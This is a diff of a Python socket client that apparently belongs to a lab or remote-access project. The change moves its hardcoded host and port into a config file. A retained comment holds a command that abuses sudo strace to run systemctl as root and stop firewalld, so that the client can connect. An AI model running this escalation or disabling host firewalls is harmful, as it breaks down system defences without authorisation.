@@ -3,6 +3,7 @@ import os
 import subprocess
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding
+import json
 
 PSS = padding.PSS(
     mgf=padding.MGF1(hashes.SHA256()),
@@ -10,20 +11,23 @@ PSS = padding.PSS(
 )
 with open("client_public.pem", "rb") as key_file:
     public_key = serialization.load_pem_public_key(key_file.read())
+
+with open("config.json") as file:
+    config = json.load(file)
+
+host = config["host"]
+port = config["port"]
+
 #disable firewall (cant connect w/o)
 #utilizes strace vuln to use systemctl as root
 #os.system('sudo strace -o /dev/null /bin/sh -c "systemctl stop firewalld"')
 # next create a socket object 
 s = socket.socket()         
-print ("Socket successfully created")
-
-# reserve a port on your computer in our 
-# case it is 12345 but it can be anything 
-port = 12345                
+print ("Socket successfully created") 
 
 while True:
     try:
-        s.connect(('10.0.2.3',12345))
+        s.connect((host,port))
     except Exception:
         continue
     break
